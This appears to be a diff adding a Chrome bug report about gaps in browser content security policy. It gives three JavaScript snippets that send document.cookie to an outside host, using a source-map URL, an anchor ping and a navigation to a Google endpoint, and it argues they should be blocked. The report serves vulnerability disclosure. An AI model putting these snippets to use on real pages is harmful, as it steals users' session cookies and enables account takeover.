@@ -1,0 +1,27 @@
+UserAgent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36
+
+Steps to reproduce the problem:
+
+1. Use sourceMapping POC:
+document.write(`<script>//# sourceMappingURL=https://pkav/?${escape(document.cookie)}</script>`)
+
+2. Use <a ping>:
+a=document.createElement('a')
+a.href='#'
+a. ping=`//pkav/?${escape(document.cookie)}`
+a. click()
+
+3. Use http 204 status
+location=`https://www.google.com/csi?${escape(document.cookie)}`;
+
+What is the expected behavior?
+send a request with data to pkav
+
+What went wrong?
+should be block it.
+
+Did this work before? N/A
+
+Chrome version: 54.0.2840.71  Channel: stable
+OS Version: 10.0
+Flash Version: Shockwave Flash 23.0 r0
